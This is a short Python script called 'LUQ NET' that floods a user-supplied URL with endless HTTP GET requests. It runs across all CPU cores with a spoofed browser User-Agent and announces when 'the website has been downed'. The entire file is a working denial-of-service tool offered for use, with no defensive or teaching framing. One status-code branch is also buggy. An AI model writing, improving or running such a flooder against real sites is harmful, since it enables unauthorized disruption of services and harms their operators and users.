import requests
import pyfiglet
from colorama import Fore, Back, Style
import multiprocessing as mp

tl = 'LUQ NET'
print(Fore.MAGENTA + pyfiglet.figlet_format(tl, font = 'slant' ))
wb = input(Fore.BLUE + 'URL: ' + Fore.CYAN)
def hit(a):
    while True:
        try:
            result = requests.get(url = wb, headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246' })
            if result.status_code == 200:
                print(Fore.GREEN + '[+] Sent/Success - Luq Net, Status Code: 200')
            elif result.status_code == 403:
                print(Fore.BLUE + '[+] Looks like the website has been downed. - Luq Net, Status Code: 403')
            else:
                print(Fore.RED + '[-] Rate Limit/Failed - Luq Net, Status Code: ' + result.status.code)
        except:
            print(Fore.RED + '[-] Unknown Error Occured - Luq Net')
            break

def init():
    pool = mp.Pool(mp.cpu_count())
    pool.map(hit, range(0, 100))
init()
